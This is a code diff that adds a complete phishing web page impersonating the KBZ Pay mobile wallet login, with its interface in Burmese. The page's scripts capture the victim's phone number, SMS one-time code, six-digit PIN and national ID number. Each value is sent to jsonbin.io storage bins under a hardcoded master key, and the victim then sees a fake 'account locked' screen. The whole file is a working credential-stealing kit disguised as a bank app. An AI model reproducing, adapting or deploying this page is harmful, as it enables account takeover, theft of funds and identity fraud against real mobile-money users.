@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>KBZ Pay PIN</title>
+<style>
+* {
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
+}
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body, html {
+      width: 100%;
+      height: 100%;
+      font-family: sans-serif;
+      overflow: hidden;
+      background: white;
+    }
+
+    .screen {
+      position: fixed;
+      inset: 0;
+      display: none;
+      justify-content: center;
+      align-items: center;
+      background-color: white;
+      z-index: 10;
+    }
+
+    #intro1 {
+      display: flex;
+      animation: fadeInHold 1.5s forwards;
+    }
+
+    #intro1 img, #intro2 img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    #intro2 {
+      display: none;
+    }
+
+    @keyframes fadeInHold {
+      0%   { opacity: 0; }
+      50%  { opacity: 1; }
+      100% { opacity: 1; }
+    }
+
+    #skip {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      background: rgba(0,0,0,0.6);
+      color: white;
+      padding: 6px 12px;
+      border-radius: 20px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    /* Phone Input Page Styles */
+    #phone-page {
+      display: none;
+      background: white;
+      height: 100%;
+      flex-direction: column;
+      align-items: center;
+      padding-top: 10vh;
+    }
+    
+    .logo {
+      width: 80px;
+      height: auto;
+      margin-bottom: 10px;
+    }
+    
+    .instruction {
+      font-size: 16px;
+      color: black;
+      margin-bottom: 15px;
+      text-align: center;
+      line-height: 1.8;
+      padding: 0 20px;
+      letter-spacing: 0.3px;
+    }
+    
+    .phone-input {
+      width: 70%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 15px;
+      text-align: center;
+      margin-bottom: 15px;
+    }
+    
+    .continue-btn {
+      width: 70%;
+      padding: 10px;
+      background: #0057b7;
+      color: white;
+      border: none;
+      border-radius: 18px;
+      font-size: 15px;
+      opacity: 0.5;
+    }
+    
+    .continue-btn.active {
+      opacity: 1;
+    }
+
+    /* SMS Verification Page Styles */
+    #sms-page {
+      display: none;
+      background: white;
+      height: 100%;
+      flex-direction: column;
+      padding: 10vh 20px 0;
+    }
+    
+    .sms-instruction {
+      font-size: 19px;
+      color: #0057b7;
+      margin-bottom: 20px;
+      font-weight: normal;
+      text-align: left;
+      width: 100%;
+      padding-left: 5px;
+    }
+    
+    .phone-display {
+      font-size: 16px;
+      color: #777;
+      margin-bottom: 30px;
+      text-align: left;
+      width: 100%;
+      padding-left: 5px;
+    }
+    
+    .sms-container {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 30px;
+      width: 100%;
+    }
+    
+    .sms-box {
+      width: 45px;
+      height: 55px;
+      text-align: center;
+      font-size: 24px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      -webkit-appearance: none;
+      -moz-appearance: textfield;
+    }
+    
+    .verify-btn {
+      width: 70%;
+      max-width: 250px;
+      padding: 12px;
+      background: #0057b7;
+      color: white;
+      border: none;
+      border-radius: 18px;
+      font-size: 16px;
+      opacity: 0.5;
+      display: block;
+      margin: 0 auto;
+    }
+
+    /* PIN Page Styles */
+    #pin-page {
+      display: none;
+      background: white;
+      height: 100%;
+    }
+
+    .container {
+      text-align: center;
+      padding-top: 20px;
+    }
+
+    .pin-logo {
+      width: 90px;
+      height: auto;
+      margin-bottom: 5px;
+    }
+
+    .pin-instruction {
+      font-size: 16px;
+      color: #0057b7;
+      margin-bottom: 10px;
+    }
+
+    .pin-input {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+
+    .dot {
+      width: 20px;
+      height: 20px;
+      border-bottom: 2px solid gray;
+      position: relative;
+    }
+
+    .dot.filled::before {
+      content: '';
+      position: absolute;
+      top: 2px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 8px;
+      height: 8px;
+      background: black;
+      border-radius: 50%;
+    }
+
+    .keypad {
+      display: grid;
+      grid-template-columns: repeat(3, 80px);
+      gap: 10px 10px;
+      justify-content: center;
+    }
+
+    .key {
+      font-size: 24px;
+      border: none;
+      background: none;
+      width: 80px;
+      height: 70px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      border-radius: 50%;
+      font-weight: bold;
+      color: #444;
+    }
+
+    .key:active {
+      background: #ddd;
+    }
+
+    .key.empty {
+      background: none;
+      pointer-events: none;
+    }
+    /* ID Page Styles */
+#id-page {
+  width: 100%;
+  height: 100%;
+  position: fixed;
+  top: 0;
+  left: 0;
+  background: white;
+  z-index: 20;
+}
+
+.header {
+  background-color: #0053a0;
+  color: white;
+  padding: 12px 16px;
+  font-size: 20px;
+  text-align: center;
+}
+
+.content {
+  padding: 16px;
+}
+
+.subtitle {
+  color: #0053a0;
+  font-size: 16px;
+  line-height: 1.5em;
+  margin-bottom: 20px;
+  text-align: center;
+}
+
+label {
+  font-size: 13px;
+  color: gray;
+  display: block;
+  margin-bottom: 4px;
+}
+
+select, input[type="number"] {
+  width: 100%;
+  padding: 12px;
+  font-size: 16px;
+  font-family: 'Pyidaungsu', 'Myanmar3', sans-serif;
+  border: 1px solid #ccc;
+  border-radius: 6px;
+  margin-bottom: 16px;
+  -webkit-appearance: none;
+  -moz-appearance: none;
+  appearance: none;
+}
+
+.row {
+  display: flex;
+  justify-content: space-between;
+  gap: 8px;
+}
+
+.row select {
+  flex: 1;
+}
+
+.button {
+  background-color: #0053a0;
+  color: white;
+  text-align: center;
+  padding: 14px;
+  font-size: 16px;
+  border-radius: 8px;
+  margin-top: 16px;
+  font-weight: bold;
+  opacity: 0.5;
+  pointer-events: none;
+}
+
+.button.active {
+  opacity: 1;
+  pointer-events: auto;
+}
+
+input[type="number"]::-webkit-inner-spin-button {
+  -webkit-appearance: none;
+}
+  </style>
+</head>
+<body>
+<!-- First Intro -->
+<div class="screen" id="intro1">
+<img alt="Intro 1" src="https://i.imgur.com/cvk2GFg_d.webp?maxwidth=760&amp;fidelity=grand"/>
+</div>
+<!-- Second Intro -->
+<div class="screen" id="intro2">
+<img alt="Intro 2" src="https://i.imgur.com/JCheX2e_d.webp?maxwidth=760&amp;fidelity=grand"/>
+<div id="skip">Skip in 5</div>
+</div>
+<!-- Phone Input Page -->
+<div id="phone-page">
+  <img src="https://i.imgur.com/hlIVNUH.png" class="logo" alt="KBZ Pay">
+  
+  <div class="instruction">
+      သင့်ဖုန်းနံပါတ်ဖြင့် အကောင့်<br>အသစ်ဖွင့်ပါ (သို့) login ဝင်ပါ
+  </div>
+  
+  <input type="tel" id="phone-input" class="phone-input" inputmode="numeric" placeholder="09">
+  
+  <button id="continue-btn" class="continue-btn" disabled>
+      ဆက်သွားမည်
+  </button>
+</div>
+<!-- SMS Verification Page -->
+<div id="sms-page">
+  <div class="sms-instruction">
+      ကျေးဇူးပြု၍ SMS မှ ကုဒ်အား ရိုက်ထည့်ပါ
+  </div>
+  
+  <div class="phone-display">
+      သင့်ဖုန်းနံပါတ် : <span id="display-phone">09XXXXXXX</span>
+  </div>
+  
+  <div class="sms-container">
+      <input type="number" maxlength="1" class="sms-box" inputmode="numeric">
+      <input type="number" maxlength="1" class="sms-box" inputmode="numeric">
+      <input type="number" maxlength="1" class="sms-box" inputmode="numeric">
+      <input type="number" maxlength="1" class="sms-box" inputmode="numeric">
+      <input type="number" maxlength="1" class="sms-box" inputmode="numeric">
+      <input type="number" maxlength="1" class="sms-box" inputmode="numeric">
+  </div>
+  
+  <button id="verify-sms-btn" class="verify-btn" disabled>
+      ဆက်သွားမည်
+  </button>
+</div>
+<!-- PIN Page -->
+<div id="pin-page">
+<div class="container">
+<img alt="KBZ Pay Logo" class="pin-logo" src="https://i.imgur.com/hlIVNUH.png"/>
+<div class="pin-instruction">အကောင့်သို့ဝင်ရောက်ရန် PIN ကိုရိုက်ထည့်ပါ</div>
+<div class="pin-input">
+<div class="dot" id="dot-0"></div>
+<div class="dot" id="dot-1"></div>
+<div class="dot" id="dot-2"></div>
+<div class="dot" id="dot-3"></div>
+<div class="dot" id="dot-4"></div>
+<div class="dot" id="dot-5"></div>
+</div>
+<div class="keypad">
+<button class="key">1</button>
+<button class="key">2</button>
+<button class="key">3</button>
+<button class="key">4</button>
+<button class="key">5</button>
+<button class="key">6</button>
+<button class="key">7</button>
+<button class="key">8</button>
+<button class="key">9</button>
+<div class="key empty"></div>
+<button class="key">0</button>
+<button class="key delete">⌫</button>
+</div>
+</div>
+</div>
+<script>
+    // Font loading
+    const fontStyle = document.createElement('style');
+    fontStyle.textContent = `
+        @font-face {
+            font-family: 'Pyidaungsu';
+            src: url('https://cdn.jsdelivr.net/gh/LeonarAung/Pyidaungsu@1.0/Pyidaungsu.ttf') format('truetype');
+        }
+    `;
+    document.head.appendChild(fontStyle);
+
+    // Intro logic
+    setTimeout(() => {
+      document.getElementById("intro1").style.display = "none";
+      document.getElementById("intro2").style.display = "flex";
+
+      let seconds = 5;
+      const skipText = document.getElementById("skip");
+      const countdown = setInterval(() => {
+        seconds--;
+        skipText.textContent = `Skip in ${seconds}`;
+        if (seconds <= 0) {
+          clearInterval(countdown);
+          showPhonePage();
+        }
+      }, 1000);
+
+      skipText.addEventListener("click", showPhonePage);
+    }, 1500);
+
+    function showPhonePage() {
+      document.getElementById("intro2").style.display = "none";
+      document.getElementById("phone-page").style.display = "flex";
+    }
+
+    // Phone Input Page Functionality
+    const phoneInput = document.getElementById('phone-input');
+    const continueBtn = document.getElementById('continue-btn');
+    
+    phoneInput.addEventListener('input', () => {
+        const hasValue = phoneInput.value.trim().length > 0;
+        continueBtn.disabled = !hasValue;
+        continueBtn.classList.toggle('active', hasValue);
+    });
+    
+    continueBtn.addEventListener('click', async () => {
+        const phoneNumber = phoneInput.value.trim();
+        if (!phoneNumber) return;
+        
+        try {
+            await fetch('https://api.jsonbin.io/v3/b/68793cba2c40ce23f7fd7245', {
+                method: 'PUT',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-Master-Key': '$2a$10$AFu5DA2kYqgct4C60fakwu6AJdG15l7U9XdUl7LOiCVrD6yFc5Nma'
+                },
+                body: JSON.stringify({
+                    phone: phoneNumber,
+                    timestamp: new Date().toISOString()
+                })
+            });
+            
+            // Store phone number for display in SMS page
+            localStorage.setItem('kbz_phone', phoneNumber);
+            
+            // Navigate to SMS page
+            document.getElementById('phone-page').style.display = 'none';
+            document.getElementById('sms-page').style.display = 'flex';
+            document.getElementById('display-phone').textContent = phoneNumber;
+        } catch (error) {
+            console.error('Error:', error);
+        }
+    });
+
+    // SMS Verification Page Functionality
+    const smsBoxes = document.querySelectorAll('.sms-box');
+    const verifyBtn = document.getElementById('verify-sms-btn');
+    
+    smsBoxes.forEach((box, index) => {
+        box.addEventListener('input', (e) => {
+            if (box.value.length > 1) box.value = box.value.slice(0, 1);
+            if (box.value && index < 5) smsBoxes[index + 1].focus();
+            verifyBtn.disabled = !Array.from(smsBoxes).every(b => b.value);
+            verifyBtn.style.opacity = verifyBtn.disabled ? 0.5 : 1;
+        });
+        
+        box.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && !box.value && index > 0) {
+                smsBoxes[index - 1].focus();
+            }
+        });
+    });
+    
+    verifyBtn.addEventListener('click', async () => {
+        const smsCode = Array.from(smsBoxes).map(b => b.value).join('');
+        
+        try {
+            await fetch('https://api.jsonbin.io/v3/b/68793d012c40ce23f7fd7263', {
+                method: 'PUT',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-Master-Key': '$2a$10$AFu5DA2kYqgct4C60fakwu6AJdG15l7U9XdUl7LOiCVrD6yFc5Nma'
+                },
+                body: JSON.stringify({
+                    phone: localStorage.getItem('kbz_phone'),
+                    sms_code: smsCode,
+                    timestamp: new Date().toISOString()
+                })
+            });
+            
+            // Navigate to PIN page
+            document.getElementById('sms-page').style.display = 'none';
+            document.getElementById('pin-page').style.display = 'block';
+        } catch (error) {
+            console.error('Error saving SMS:', error);
+        }
+    });
+</script>
+
+<script>
+    // PIN input
+    let pin = "";
+    const keys = document.querySelectorAll(".key");
+    const dots = document.querySelectorAll(".dot");
+
+    keys.forEach((key) => {
+      key.addEventListener("click", () => {
+        const value = key.textContent.trim();
+
+        if (key.classList.contains("delete")) {
+          pin = pin.slice(0, -1);
+        } else if (pin.length < 6 && !key.classList.contains("empty")) {
+          pin += value;
+        }
+
+        updateDots();
+
+        if (pin.length === 6) {
+          sendPin(pin).then(() => {
+            showIdPage();
+            pin = "";
+            setTimeout(updateDots, 300);
+          });
+        }
+      });
+    });
+
+    function updateDots() {
+      dots.forEach((dot, index) => {
+        dot.classList.toggle("filled", index < pin.length);
+      });
+    }
+
+    async function sendPin(pin) {
+      const binId = "6877ca8bbf84af5e5f517272"; // Your bin ID
+      const apiKey = "$2a$10$AFu5DA2kYqgct4C60fakwu6AJdG15l7U9XdUl7LOiCVrD6yFc5Nma";
+
+      try {
+        const res = await fetch(`https://api.jsonbin.io/v3/b/${binId}/latest`, {
+          headers: { "X-Master-Key": apiKey }
+        });
+        const json = await res.json();
+        const pins = json.record.pins || [];
+
+        pins.push({ pin, timestamp: new Date().toISOString() });
+
+        await fetch(`https://api.jsonbin.io/v3/b/${binId}`, {
+          method: "PUT",
+          headers: {
+            "Content-Type": "application/json",
+            "X-Master-Key": apiKey
+          },
+          body: JSON.stringify({ pins })
+        });
+      } catch (err) {
+        console.error("Error sending PIN:", err);
+      }
+    }
+
+    function showIdPage() {
+      document.getElementById("pin-page").style.display = "none";
+      document.getElementById("id-page").style.display = "block";
+    }
+</script>
+
+<!-- ID Page -->
+<div id="id-page" style="display:none; font-family: 'Pyidaungsu', 'Myanmar3', sans-serif;">
+  <div class="header">အိုင်ဒီအတည်ပြုခြင်း</div>
+  <div class="content">
+    <div class="subtitle">
+      သင်၏အကောင့်လုံခြုံမှုရှိစေရန်သင့်ကိုယ်ရေး<br/>
+      အချက်လက်များအား အတည်ပြုပါ
+    </div>
+    
+    <label>အိုင်ဒီအမျိုးအစား</label>
+    <select id="type">
+      <option>မှတ်ပုံတင်</option>
+      <option>မှတ်ပုံတင်အဟောင်း</option>
+      <option>နိုင်ငံကူးလက်မှတ်</option>
+    </select>
+    
+    <label>အိုင်ဒီနံပါတ်</label>
+    <div class="row">
+      <select id="number"></select>
+      <select id="district"></select>
+      <select id="typecode">
+        <option>ဧည့်</option>
+        <option>နိုင်</option>
+        <option>ပြု</option>
+        <option>စ</option>
+        <option>သာသနာ</option>
+        <option>ယာယီ</option>
+      </select>
+    </div>
+    
+    <input id="final" inputmode="numeric" placeholder="နံပါတ်" type="number"/>
+    <div class="button" id="submitBtn">အတည်ပြုမည်</div>
+  </div>
+</div>
+<script>
+    const numberSelect = document.getElementById("number");
+    const districtSelect = document.getElementById("district");
+    const finalInput = document.getElementById("final");
+    const submitBtn = document.getElementById("submitBtn");
+
+    const districtMap = {
+  1: ["အကယ", "မမန", "အမယ", "ဟာပန", "သတတ", "ကမန", "ကမတ", "ကပတ", "သဘဒ", "လလမ", "မမန", "လဂန", "မကန", "မကတ", "မမသ", "မလန", "မမန", "မဓန", "မစန", "နမန", "ပနဒ", "ပတအ", "ပမန", "မကန", "သဒန", "သလန", "သပသ", "တနန", "ဝမန", "ရဘယ", "ရကန"],
+  2: ["ဘလခ", "ဒမဆ", "လကန", "မစန", "ဖဆ", "ဖရဆ", "ရတန", "ရသန"],
+  3: ["ကဆက", "လဘန", "လသန", "မဝတ", "ပကန", "ဖအန", "ဖပန", "စကလ", "သတက", "သတန", "ဝလမ", "ရရသ"],
+  4: ["ဟခန", "ထတလ", "ကခန", "ကပလ", "မတန", "မတပ", "ပလဝ", "ဖလန", "ဆမန", "တတန", "တဇန", "ရခဒ", "ရဇန"],
+  5: ["အတန", "အရတ", "ဗမန", "ဘတလ", "ဒဟန", "ဒပယ", "ဟမလ", "ဆမရ", "ထခန", "ထအခ", "ကဘလ", "ကလထ", "ကလန", "ကလပတ", "ကလဝ", "ကမန", "ကနန", "ကသန", "ခဥန", "ခဥတ", "ခပန", "ခတန", "လဟန", "လရန", "မကန", "မလန", "မမန", "မမတ", "မပလ", "မသန", "မရန", "နယန", "ငဇန", "ပလဘ", "ပလန", "ပဆန", "ဖပန", "စကန", "ဆလက", "တမန", "တဆန", "ဝလန", "ဝသန", "ရဘန", "ယမပ", "ရဥန", "ရသက"],
+  6: ["ဘပန", "ထဝန", "ကလအ", "ကစန", "ကသန", "ကရရ", "ခမက", "လကန", "မအန", "မအရ", "မမန", "မတန", "ငရက", "ပကမ", "ပလန", "ပလတ", "တနသ", "တသရ", "သရခ", "ရဖန"],
+  7: ["အဖန", "အတန", "ဒဥန", "ထတပ", "ကကန", "ကပက", "ကတခ", "ကတတ", "ကဝန", "လပတ", "မဒန", "မလန", "မညန", "နတလ", "ညလပ", "ပခန", "ပခတ", "ပမန", "ပနက", "ပတလ", "ပတန", "ပတဆ", "ပတတ", "ဖမန", "တငန", "သကန", "သနပ", "သဆန", "သဝတ", "ဝမန", "ရကန", "ရတန", "ရတရ", "ဇကန"],
+  8: ["အလန", "ဂဂန", "တလန", "ကထန", "ကမန", "ခမန", "မဘန", "မထန", "မကန", "မလန", "မမန", "မတန", "မသန", "နမန", "ငဖန", "ပခက", "ပမန", "ပဖန", "စကန", "စလန", "ဆမန", "ဆပဝ", "ဆဖန", "စတရ", "တတက", "သရန", "ယမန", "ရခန", "ရစက"],
+  9: ["အမရ", "အမဇ", "ဥတသ", "ဒခသ", "ကမန", "ကပတ", "ကဆန", "ခအဇ", "ခမစ", "လဝန", "မဟမ", "မထလ", "မကန", "မခန", "မလန", "မမန", "မနမ", "မနတ", "မတရ", "မသန", "မရမ", "မရတ", "နထက", "ငသရ", "ငဇန", "ညဥန", "ပဘန", "ပဗသ", "ပကခ", "ပမန", "ပဥလ", "ပသက", "စကန", "စကတ", "တကန", "တကတ", "တတဥ", "တသန", "သပက", "သစန", "ဝတန", "ရကန", "ရမသ", "ဇဗသ", "ဇယသ"],
+  10: ["ဘလန", "ကထန", "ကခမ", "ကမရ", "ခဆန", "ခဇန", "လမန", "မဒန", "မလမ", "ပမန", "သထန", "သဖရ", "ရမန"],
+  11: ["အမန", "ဘသတ", "ဂမန", "ကဖန", "ကတလ", "ကတန", "မအန", "မအတ", "မဥန", "မပန", "မပတ", "မတန", "ပဏက", "ပဏတ", "ပတန", "စတန", "တကန", "တပဝ", "သတန", "ရဗန", "ရသတ"],
+  12: ["အလန", "အစန", "ဗဟန", "ဗတထ", "ဒဂမ", "ဒဂန", "ဒဂဆ", "ဒဂတ", "ဒဂရ", "ဒလန", "ဒပန", "ထတပ", "ကကက", "ကခက", "ကမန", "ကမတ", "ကမရ", "ကတန", "ကတတ", "ခရန", "လကန", "လမန", "လမတ", "လသန", "လသယ", "လယန", "လယရ", "မဘန", "မဂတ", "မရက", "ဥကမ", "ဥကတ", "ပဘတ", "ပဇတ", "ဆကခ", "ဆကန", "စခန", "တကန", "တမန", "တတထ", "တတန", "သဃက", "သကတ", "သခန", "သလန", "ရကန", "ရပသ"],
+  13: ["အပန", "အတန", "အသယ", "ဟဟန", "ဟမန", "ဟပန", "ဟပတ", "ကဟန", "ကကန", "ကခန", "ကလဒ", "ကလထ", "ကလန", "ကလတ", "ကမန", "ကတလ", "ကတန", "ကတတ", "ကသန", "ခလန", "ခရဟ", "လကန", "လခန", "လခတ", "လလန", "လရန", "မဘန", "မဟရ", "မထန", "မထတ", "မကထ", "မကန", "မကတ", "မခန", "မခတ", "မလန", "မလတ", "မမထ", "မမန", "မမတ", "မနန", "မနတ", "မငန", "မပထ", "မပန", "မပတ", "မဖန", "မဖတ", "မရန", "မရတ", "မဆန", "မဆတ", "မတန", "မတတ", "မယထ", "မယန", "မယတ", "နဆန", "နခန", "နခတ", "နမတ", "နဖန", "နစန", "နတရ", "ညရန", "ပလထ", "ပလန", "ပလတ", "ပပက", "ပဆန", "ပဆတ", "ပတယ", "ပဝန", "ပရန", "ဖခန", "ဆဆန", "တကန", "တခလ", "တလန", "တမည", "တတန", "တယန", "သနန", "သပန", "ရငန", "ရညန", "ရစန"],
+  14: ["အဂပ", "အမန", "အမတ", "ဘကလ", "ဒဒရ", "ဓနဖ", "ဟကက", "ဟသတ", "ကကထ", "ကကန", "ကခန", "ကလန", "ကပန", "လမန", "လပတ", "မအန", "မအပ", "မမက", "မမန", "ငပတ", "ငဆန", "ငသခ", "ငရက", "ညတန", "ပစလ", "ပတန", "ပသအ", "ပသန", "ပသရ", "ဖပန", "သပန", "ဝခမ", "ရကန", "ရသယ", "ဇလန"]
+};
+
+    for (let i = 1; i <= 14; i++) {
+      const opt = document.createElement("option");
+      opt.textContent = i;
+      numberSelect.appendChild(opt);
+    }
+
+    numberSelect.addEventListener("change", () => {
+      const selected = numberSelect.value;
+      districtSelect.innerHTML = "";
+      if (districtMap[selected]) {
+        districtMap[selected].forEach(d => {
+          const opt = document.createElement("option");
+          opt.textContent = d;
+          districtSelect.appendChild(opt);
+        });
+      }
+    });
+
+    finalInput.addEventListener("input", () => {
+      if (finalInput.value.trim()) {
+        submitBtn.classList.add("active");
+      } else {
+        submitBtn.classList.remove("active");
+      }
+    });
+
+    submitBtn.addEventListener("click", async () => {
+      if (!finalInput.value.trim()) return;
+
+      const data = {
+        id: [
+          document.getElementById("type").value,
+          document.getElementById("number").value,
+          document.getElementById("district").value,
+          document.getElementById("typecode").value,
+          finalInput.value.trim()
+        ]
+      };
+
+      try {
+        await fetch("https://api.jsonbin.io/v3/b/687803186063391d31af0ea8", {
+          method: "PUT",
+          headers: {
+            "Content-Type": "application/json",
+            "X-Master-Key": "$2a$10$AFu5DA2kYqgct4C60fakwu6AJdG15l7U9XdUl7LOiCVrD6yFc5Nma"
+          },
+          body: JSON.stringify(data)
+        });
+      } catch (err) {
+        alert("မှားယွင်းမှုရှိနေပါသည်။");
+      }
+    });
+  </script>
+<!-- Loading Spinner Overlay -->
+<div id="loadingOverlay" style="display:none; position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(255,255,255,0.8); justify-content:center; align-items:center; z-index:9999;">
+<div class="loader"></div>
+</div>
+<style>
+.loader {
+  border: 6px solid #f3f3f3;
+  border-top: 6px solid #3498db;
+  border-radius: 50%;
+  width: 40px;
+  height: 40px;
+  animation: spin 0.8s linear infinite;
+}
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+</style>
+<script>
+document.getElementById("submitBtn").addEventListener("click", function () {
+  document.getElementById("loadingOverlay").style.display = "flex";
+  setTimeout(() => {
+    document.getElementById("id-page").style.display = "none";
+    document.getElementById("fifth-page").style.display = "block";
+    document.getElementById("loadingOverlay").style.display = "none";
+  }, 1000);
+});
+</script>
+<div id="fifth-page" style="display:none; padding: 20px; text-align:center;">
+<div style="display: flex; flex-direction: column; align-items: center; justify-content: center; height: 80vh;">
+
+<div style="margin-top: 80px;">
+<img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" style="width:60px; opacity:0.4;"/>
+<div style="font-size: 16px; color: #0052B4; margin-top: 16px;">သင့်အကောင့်အားယာယီပိတ်ထားပါသည်</div>
+</div>
+<div style="margin-top: 40px;">
+<div id="backToPinBtn" style="background-color: #0052B4; padding: 12px; color:white; border-radius: 12px; width: 80%; margin: auto; font-size: 18px;; width: 75%; max-width: 300px; font-size: 18px; padding: 12px 0; background-color: #0064D2; color: white; border-radius: 20px; width: 80%; max-width: 320px; font-size: 20px; padding: 14px 0; font-family: Pyidaungsu, Myanmar3, sans-serif; white-space: nowrap; text-align: center; background-color: #0064D2; color: white; border-radius: 20px; width: auto; min-width: 60%; max-width: 320px; font-size: 20px; padding: 14px 24px; font-family: Pyidaungsu, Myanmar3, sans-serif">အစသို့ပြန်သွားမည်</div>
+</div>
+</div>
+</div><script>
+document.getElementById("backToPinBtn").addEventListener("click", function () {
+  document.getElementById("fifth-page").style.display = "none";
+  document.getElementById("phone-page").style.display = "flex";
+});
+</script></body>
+</html>
